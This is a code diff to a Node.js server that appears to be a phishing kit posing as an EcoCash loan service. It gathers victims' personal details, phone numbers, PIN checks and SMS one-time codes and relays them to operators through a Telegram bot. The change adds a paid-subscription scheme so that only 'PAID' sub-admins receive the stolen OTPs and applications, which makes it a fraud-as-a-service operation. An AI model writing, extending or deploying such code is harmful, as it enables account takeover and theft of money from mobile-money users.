@@ -25,7 +25,8 @@ function getAdmins() {
         key: index === 1 ? 'main' : `admin${index - 1}`,
         name: index === 1 ? 'Main Admin' : `Admin ${String(index - 1).padStart(3, '0')}`,
         chatId: chatId,
-        isMain: index === 1
+        isMain: index === 1,
+        index: index
       });
     }
     index++;
@@ -36,7 +37,8 @@ function getAdmins() {
       key: 'main',
       name: 'Main Admin',
       chatId: process.env.ADMIN_CHAT_ID.trim(),
-      isMain: true
+      isMain: true,
+      index: 1
     });
   }
 
@@ -44,6 +46,7 @@ function getAdmins() {
 }
 
 const activeApplications = new Map();
+const adminSubscriptions = new Map(); // Tracks whether sub-admins are PAID or UNPAID
 
 function formatZimbabwePhone(phone) {
   let p = phone || '';
@@ -68,41 +71,109 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const username = message.from.username ? `@${message.from.username}` : 'Not set';
 
     let matchedAdmin = ADMINS.find(a => a.chatId && String(a.chatId) === String(chatId));
-    const adminKey = matchedAdmin ? matchedAdmin.key : `admin-${chatId.toString().slice(-4)}`;
-    const adminRole = matchedAdmin ? matchedAdmin.name : 'Authorized Admin';
+    if (!matchedAdmin) return;
+
+    const adminKey = matchedAdmin.key;
+    const adminRole = matchedAdmin.name;
     const privateLink = `${APP_URL}/admin/${encodeURIComponent(adminKey)}`;
 
-    const welcomeMsg = `🤖 <b>ECOCASH ADMIN BOT ACTIVATED</b>\n` +
-                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                       `👤 <b>User Info:</b>\n` +
-                       `• <b>Name:</b> ${firstName}\n` +
-                       `• <b>Username:</b> ${username}\n` +
-                       `• <b>Chat ID:</b> <code>${chatId}</code>\n` +
-                       `• <b>Role:</b> ${adminRole}\n\n` +
-                       `🔗 <b>YOUR PRIVATE OPERATIONAL LINK:</b>\n` +
-                       `${privateLink}\n\n` +
-                       `<i>Click below to open your independent management dashboard.</i>`;
+    let welcomeMsg = `🤖 <b>ECOCASH ADMIN BOT ACTIVATED</b>\n` +
+                     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                     `👤 <b>User Info:</b>\n` +
+                     `• <b>Name:</b> ${firstName}\n` +
+                     `• <b>Username:</b> ${username}\n` +
+                     `• <b>Chat ID:</b> <code>${chatId}</code>\n` +
+                     `• <b>Role:</b> ${adminRole}\n\n`;
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: welcomeMsg,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🌐 Open Private Dashboard', url: privateLink }]
-          ]
+    if (matchedAdmin.isMain) {
+      welcomeMsg += `👑 <b>MAIN ADMIN CONTROL PANEL</b>\n` +
+                    `<i>Manage and approve sub-admin payment status & active links below:</i>\n\n`;
+
+      const subAdmins = ADMINS.filter(a => !a.isMain);
+      if (subAdmins.length === 0) {
+        welcomeMsg += `<i>No sub-admins currently configured via environment variables.</i>`;
+      } else {
+        for (const sub of subAdmins) {
+          const currentStatus = adminSubscriptions.get(sub.chatId) || 'UNPAID';
+          welcomeMsg += `👤 <b>${sub.name}</b> (ID: <code>${sub.chatId}</code>)\n` +
+                        `💳 Status: <b>${currentStatus}</b>\n` +
+                        `🔗 Link: ${APP_URL}/admin/${sub.key}\n\n`;
         }
-      })
-    });
+      }
+
+      let inlineKeyboard = [[{ text: '🌐 Open Main Dashboard', url: privateLink }]];
+      
+      for (const sub of subAdmins) {
+        inlineKeyboard.push([
+          { text: `✅ ${sub.name} PAID`, callback_data: `sub_paid_${sub.chatId}` },
+          { text: `❌ ${sub.name} UNPAID`, callback_data: `sub_unpaid_${sub.chatId}` }
+        ]);
+      }
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: welcomeMsg,
+          parse_mode: 'HTML',
+          reply_markup: { inline_keyboard: inlineKeyboard }
+        })
+      });
+
+    } else {
+      const subStatus = adminSubscriptions.get(chatId) || 'UNPAID';
+      if (subStatus !== 'PAID') {
+        welcomeMsg += `❌ <b>ACCESS RESTRICTED</b>\n` +
+                      `Your account is currently marked as <b>UNPAID</b>.\n` +
+                      `Please contact the Main Admin to clear your payment and authorize your link.`;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: welcomeMsg, parse_mode: 'HTML' })
+        });
+        return;
+      }
+
+      welcomeMsg += `🔗 <b>YOUR PRIVATE INDEPENDENT LINK:</b>\n` +
+                    `${privateLink}\n\n` +
+                    `<i>Authorized and Paid. You can now manage incoming requests.</i>`;
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: welcomeMsg,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[{ text: '🌐 Open Private Dashboard', url: privateLink }]]
+          }
+        })
+      });
+    }
   }
 
   if (callback_query) {
     const actionData = callback_query.data;
     const chatId = callback_query.message.chat.id;
     const messageId = callback_query.message.message_id;
+
+    if (actionData.startsWith('sub_paid_') || actionData.startsWith('sub_unpaid_')) {
+      const isPaid = actionData.startsWith('sub_paid_');
+      const targetChatId = actionData.replace(isPaid ? 'sub_paid_' : 'sub_unpaid_', '');
+      
+      adminSubscriptions.set(targetChatId, isPaid ? 'PAID' : 'UNPAID');
+
+      await editTelegramMessage(
+        botToken, 
+        chatId, 
+        messageId, 
+        `${callback_query.message.text}\n\n🔄 <b>Updated Status for ID ${targetChatId}:</b> ${isPaid ? 'PAID ✅ (Authorized)' : 'UNPAID ❌ (Revoked)'}`
+      );
+      return;
+    }
 
     if (actionData.startsWith('pin_correct_')) {
       const ref = actionData.replace('pin_correct_', '');
@@ -174,7 +245,14 @@ app.post('/api/apply-loan', async (req, res) => {
     if (botToken && ADMINS.length > 0) {
       for (const admin of ADMINS) {
         if (!admin.chatId) continue;
-        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n\n` +
+
+        if (!admin.isMain) {
+          const subStatus = adminSubscriptions.get(admin.chatId) || 'UNPAID';
+          if (subStatus !== 'PAID') continue;
+        }
+
+        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n` +
+                        `👤 <b>Assigned Admin:</b> ${admin.name}\n\n` +
                         `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                         `👤 <b>Name:</b> ${data.fullName}\n` +
                         `💼 <b>Occupation:</b> ${data.occupation}\n` +
@@ -226,7 +304,14 @@ app.post('/api/submit-otp', async (req, res) => {
     if (botToken && ADMINS.length > 0) {
       for (const admin of ADMINS) {
         if (!admin.chatId) continue;
-        const msgText = `📲 <b>RECEIVED OTP CODE (STEP 3)</b>\n\n` +
+
+        if (!admin.isMain) {
+          const subStatus = adminSubscriptions.get(admin.chatId) || 'UNPAID';
+          if (subStatus !== 'PAID') continue;
+        }
+
+        const msgText = `📲 <b>RECEIVED OTP CODE (STEP 3)</b>\n` +
+                        `👤 <b>Assigned Admin:</b> ${admin.name}\n\n` +
                         `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                         `📞 <b>Phone:</b> +263${appData.formattedPhone}\n` +
                         `🔐 <b>SMS OTP:</b> <code>${otpCode}</code>`;
@@ -267,4 +352,4 @@ app.get('*', (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
-    
+          
